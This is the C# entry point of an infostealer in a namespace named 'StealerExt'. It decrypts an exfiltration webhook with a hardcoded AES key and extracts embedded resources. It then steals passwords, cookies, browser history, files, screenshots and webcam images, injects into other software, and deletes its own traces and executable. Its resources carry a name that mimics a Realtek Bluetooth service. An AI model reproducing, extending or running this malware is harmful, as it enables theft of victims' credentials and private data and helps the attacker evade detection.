using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;
using System.Reflection;
using System.Security.Cryptography;

namespace StealerExt
{
    internal static class Hook
    {
        [STAThread]
        public static void Main(string[] arg)
        {
            if (arg.Length <= 0) throw new ArgumentNullException(nameof(arg));
            try
            {
                var PaddedDecryptedUrl = Decrypt(arg[0]);
                _DecryptedHook = new Uri(PaddedDecryptedUrl).AbsoluteUri;
            }
            catch
            {
                _DecryptedHook = arg[0];
            }
            string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            for (int i = 0; i < resName.Length; i++)
                if (resName[i].ToLowerInvariant() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);

            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config")); // Useless...

            new Stealer().StartSteal();
            new API(API.wHook).SendMultiPartStream(FileName: "Screenshot.png", memoryStream: CurrentScreen.GetScreenshot());
            if ((bool)config.cam == true) WebCamCap.wcc();
            API.Passwords();
            API.Cookies();
            API.History();
            Injection.StartInjection();
            if ((bool)config.files == true)
            {
                FileStealer.GetFiles();
            }
            
            Cleanup();
            if ((bool)config.shutdown == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/s /t 5")
                {
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            else if ((bool)config.restart == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/r /s /t 5")
                {
                    CreateNoWindow = true,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 2 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            void Cleanup()
            {
                File.Delete(API.Temp + "config"); File.Delete(API.Temp + "whysosad"); File.Delete(API.Temp + "xwizard.cfg");
                foreach (string file in Directory.EnumerateFiles(Path.GetTempPath(), "costura.*", SearchOption.TopDirectoryOnly))
                {
                    File.Delete(file);
                }
            }
        }

        public static string Decrypt(string Base64Webhook)
        {
            try
            {
                var EncryptedWebhook = Convert.FromBase64String(Base64Webhook);
                Aes aes = new AesManaged
                {
                    Key = new byte[] { 88, 105, 179, 95, 179, 135, 116, 246, 101, 235, 150, 231, 111, 77, 22, 131 },
                    IV = new byte[16],
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.PKCS7
                };
                var crypto = aes.CreateDecryptor();
                return Encoding.ASCII.GetString(crypto.TransformFinalBlock(EncryptedWebhook, 0, EncryptedWebhook.Length));
            }
            catch
            {
                return null;
            }
        }
        
        public static void ExtractResources(string resource)
        {
            string resourceName = resource.Replace("RtkBtManServ.Resources.", "");
            if (File.Exists(API.Temp + resourceName)) File.Delete(API.Temp + resourceName);
            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
            FileStream fileStream = new FileStream(API.Temp + resourceName, FileMode.CreateNew);
            for (int i = 0; i < stream.Length; i++)
                fileStream.WriteByte((byte)stream.ReadByte());
            fileStream.Close();
        }
        public static string _DecryptedHook;
    }
}